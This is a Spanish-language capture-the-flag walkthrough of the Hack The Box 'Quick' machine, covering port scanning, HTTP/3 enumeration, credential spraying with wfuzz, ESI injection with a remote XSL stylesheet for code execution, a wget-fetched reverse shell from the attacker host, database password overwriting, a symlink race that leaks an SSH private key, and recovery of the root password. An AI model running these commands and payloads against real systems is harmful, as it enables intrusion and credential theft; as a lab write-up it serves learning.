@@ -1,0 +1,161 @@
+
+	Quick - 10.10.10.186 - Linux
+
+#nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.186 -oG allPorts
+	Puertos abiertos: 22,9001
+
+#nmap -sC -sV -p22,9001 10.10.10.186 -oN targeted
+	9001 = http
+		Si habrímos la página web, vemos que hay un comunidado de que migran la página web, y que nos llegará a portal.quick.htb, por lo que: 
+		Nos abrimos el /etc/hosts y añadimos las dirección portal.quick.htb y quick.htb
+			Última versión TLS y HTTP ->>
+
+Si hacemos un escaneo por UDP al puerto 443 ya que nos ridirige por https y en TCP no está abierto, vermos:
+#nmap -p443 --open -sU -T5 -n -v 10.10.10.186 
+
+	PORT    STATE         SERVICE
+	443/udp open|filtered https
+
+Como se trata de http3 y curl no está actualizado, utilizaremos la herramienta quiche para vincularla con curl y así poder tramitar peticiones http3
+Después de instalar y clonar curl, usamos el curl clonado, el que nos permite utilizar http3
+
+# ./curl -s --http3 https://portal.quick.htb/ -k | html2markdown
+	-k (para el autofirmado)
+	de este modo visualizamos lo más importante y vemos que "salen" otras cosas
+
+# ./curl -s --http3 "https://portal.quick.htb/index.php?view=about" -k | html2markdown | grep "quick.htb"
+	Nos muestra correos electronicos, es decir usuarios válidos del dominio
+
+# ./curl -s --http3 "https://portal.quick.htb/index.php?view=docs" -k
+	Nos reporta dos pdfs
+	Nos los descargamos
+#./curl  --http3 "https://portal.quick.htb/docs/QuickStart.pdf" -k  --output /home/dimegio/Dimegio/HTB/Quick/content/QuickStart.pdf
+#./curl  --http3 "https://portal.quick.htb/docs/Connectivity.pdf" -k  --output /home/dimegio/Dimegio/HTB/Quick/content/Connectivity.pdf
+Visualizando el Connectivity encontramos una contraseña: Quick4cc3$$
+
+Tenemos una credencial, que puede ser de alguien de los usuarios, por lo que intentemos logearnos en el panel de login.php que hemos encontrado en la página web
+Destacar que también hemos visto otros usuarios potenciales de compañías externas en la página web por lo que también intentamos con ellos:
+
+Para no tramitar petición por petición, nos crearemos un diccionario con los usuarios y utilizaremos wfuzz para emitir todas las peticiones
+Para obtener la data que tenemos que enviar, intentamos tramitar una petición con la pestaña de network activada (F12) y vemos la data POST tramitada
+
+#wfuzz -c -w users -d 'email=FUZZ&password=Quick4cc3$$' http://10.10.10.186:9001/login.php
+ Todas las respuestas nos dan 200 menos: elisa@wink.co.uk que nos ha dado un 302, por lo que la credencial es de ella.
+
+
+En la página, podemos crear tickets pero no los podemos ver, porque no es funcional el botón.
+Buscamos archivos php
+
+#wfuzz -c --hc=404 -H "Cookie: PHPSESSID=32gqcs3f0n32cl3445kknfi3p3" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://10.10.10.186:9001/FUZZ.php
+
+con el fuzzing descubrimos rutas potenciales en las que encontramos search, donde nos debería de llevar el botón no funcional.
+Si generamos un ticket y buscamos por el nombre identificativo, nos reporta información sobre el ticket
+#http://10.10.10.186:9001/search.php?search=TKT-2116
+
+Veemos si los campos son inyectables ya que nosotros somos quien introduce los datos.
+Introducidos por ejemplo inyecciones html
+<h1>Dimegio</h1>
+<script>alert("XSS")</alert>
+
+Y vemos que lo interpreta,por lo que si que es vulnerable a XSS, sin embargo si hacemos un cookie hijacking no, nos reportaría nada en este caso ya que nadie veria nuestro ticket
+
+Por otro lado si miramos las cabeceras:
+#curl -S -X GET http://10.10.10.186:9001 -I
+Nos reporta que el X-Powered es de Esigate, buscando en google vemos etiqueta XSLT, por lo que intamos aplicarlo al campo para ver si es vulnerable
+#https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/
+
+Introduciendo el código en en campo:
+#<esi:include src="http://10.10.16.2/pwnd"></esi:include> 
+Y poniendonos a la escucha con netcat
+#nc -nlvp 80
+Veemos que pide el recurso, por lo que es vulnerable
+
+Aplicamos
+
+#<esi:include src="http://10.10.16.2/rce.xml" stylesheet="http://10.10.16.2/rce.xsl">
+#</esi:include>
+
+Y estando a la escucha 
+#sudo tcpdump -i tun0 icmp -n
+	Para ver si nos llega el paquete
+
+Y compartiendo el xsl
+#php -S 0.0.0.0:80
+
+Si todo sale bien, habremos recibido un paquete por parte de la máquina víctima, por lo que tendríamos ejecución remota de comandos
+
+Teniendo esto claro, para obtener una reverse shell
+necesitamos hacer dos modificaciones al xsl
+primero subimos con wget el archivo de reverse shell
+#wget http://10.10.16.2/shell
+Al recargar el ticket como se llama igual no deberíamos de crear un nuevo, directamente haría el GET
+Cuando el servidor ya dispone del archivo shell, sustituimos el comando por: 
+#bash shell
+y poniendonos a la escucha con netcat
+#nc -nlvp 443
+
+Al recargar el ticket obtendríamos nuestra reverse shell
+
+Una vez dentro del sistema hacemos un tratamiento de la tty
+
+Podemos visualizar directamente la flag user.txt
+
+Inspeccionando veemos los archivos php de la página web en /var/www/html donde encontramos db.php con credenciales
+db_adm
+db_p4ss
+
+Nos conectamos a mysql
+#mysql -udb_adm -p
+
+show databases;
+use quick;
+show tables;
+describe users;
+mysql> SELECT * FROM users;
++--------------+------------------+----------------------------------+
+| name         | email            | password                         |
++--------------+------------------+----------------------------------+
+| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
+| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
++--------------+------------------+----------------------------------+
+
+Sabiendo que estamos corriendo un apache, nos podemos dirigir al directorio de configuración de apache: /etc/apache2/
+donde en este buscamos el archivo sites-enabled/000-default.conf
+
+Y vemos un ServerName nuevo printerv2.quick.htb
+
+Como el puerto 9001 está abierto, nos abrimos:
+http://printerv2.quick.htb:9001/
+
+Nosotros, teniendo la contraseña Quick4cc3$$, que es la de Elisa, si miramos el login.php (/var/www/html) miramos como se computa el hash
+
+#php --interactive
+php > echo md5(crypt("Quick4cc3$$", 'fa'));
+	c6c35ae1f3cb19438e0199cfa72a9d9d
+	por lo que ya sabemos como se computa la contraseña.
+
+Sin embargo lo que podríamos hacer es pudiendo escribir en la base de datos, cambiar la contraseña del Server Admin a la misma que tiene Elisa ya que es una contraseña que ya sabemos
+
+mysql> update users set password = 'c6c35ae1f3cb19438e0199cfa72a9d9d' where name = "Server Admin";
+
+Ahora ya podríamos acceder con la contraseña Quick4cc3$$ y el usuario srvadm@quick.htb en la página web
+
+Después de ver como funciona las impresoras y de que nos podemos establecer una conexión, capturando el mensaje con netcat, 
+Nos podemos ir a jobs, capturar la tarea que se ejecute en ese mismo instante, y justo cuando esté haciendo el sleep hacer un enlace simbólico al archivo id_rsa del usuario, de modo que nos imprimirá su id_rsa y no la cadena que pusimos
+#while true; do date=$(date +%F_%H:%M:%S); if [ -r $date ]; then ln -s -f /home/srvadm/.ssh/id_rsa $date; break; fi; done
+
+#nc -nlvp 9100
+#chmod 600 id_rsa
+#ssh -i id_rsa srvadm@10.10.10.186
+
+
+Una vez dentro del ssh, miramos y encontramos el siguiente archivo:
+/home/srvadm/.cache/conf.d/printers.conf
+Inspeccionandolo vemos la DeviceURI que tiene una contraseña
+
+#php > echo urldecode("https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer");
+lo decodificamos: 
+https://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer
+
+Por lo que la contraseña del root: &ftQ4K3SGde8?
+#su root
